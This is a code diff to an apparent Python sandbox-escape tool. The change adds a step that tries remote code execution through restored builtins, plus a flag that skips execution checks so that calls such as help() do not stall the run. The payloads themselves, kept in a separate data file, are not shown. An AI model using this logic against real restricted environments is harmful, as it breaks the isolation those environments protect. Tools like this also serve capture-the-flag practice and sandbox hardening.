@@ -96,11 +96,14 @@ def bypassMAIN(local_scope: Dict[str, Any] = {},
     # changes in local scope comparing to standard builtins
     change_in_builtins = [i for i in local_scope if i in dir(builtins)]
 
-    def try_to_restore(data_name:str, check:object):
+    def try_to_restore(data_name:str, check:object=None, end_of_prog=False):
         """
         Try to obtain certain thing from the original scope.
         data_name is a string that can refer to a list in RCE_data.json
-        check is a class-type object to check if the payload is valid
+        check is a class-type object to check if the payload is valid, 
+        if not specified, any object will be accepted.
+        end_of_prog is a boolean flag to indicate if the program is ending if 
+        one of the restore success.
         """
         data_name_tag = data_name.upper()
         path = filter_path_list(RCE_data[data_name], tagged_scope)
@@ -112,9 +115,12 @@ Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
             if _:
                 success = False
                 for i in _:
-                    if exec_with_returns(i, original_scope).__class__ == check:
+                    # If end of program, no need to exec to check in case of stucking by RCE function like help()
+                    if end_of_prog: exec_with_returns_ = lambda _, __: True
+                    else: exec_with_returns_ = exec_with_returns
+                    if exec_with_returns_(i, original_scope).__class__ == check or check is None:
                         success = True
-                        tagged_scope[i] = [exec_with_returns(i, original_scope), data_name_tag]
+                        tagged_scope[i] = [exec_with_returns_(i, original_scope), data_name_tag]
                         achivements[data_name] = [i, len(_)]
                         tags.append(data_name_tag)
                         generated_path[data_name_tag] = i
@@ -122,6 +128,7 @@ Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
                 if success:
                     logger.info('[+] Success. %d payload(s) in total.', len(_))
                     logger.debug(f'[*] payloads: {_}')
+                    if end_of_prog: bypasses_output(i)
                 else:
                     achivements[data_name] = ['None', 0]
                     logger.info('[-] no way to bypass blacklist to obtain %s.', data_name)
@@ -275,8 +282,14 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                 logger.info('[-] no way to find a bypass method to restore builtins in other namespaces.')
         else:
             logger.info('[-] no paths found to restore builtins in other namespaces.')
+            
+    # Step8: Try to RCE directly with builtins
+    if 'BUILTINS_SET' in tags or 'MOUDLE_BUILTINS' in tags:
+        logger.info('[*] try to RCE directly with builtins.')
+        try_to_restore('builtins2RCE', end_of_prog=True)
+        
 
-    # Step8: Try to restore __import__
+    # Step9: Try to restore __import__
 
     try_to_restore('import', __import__.__class__)
 
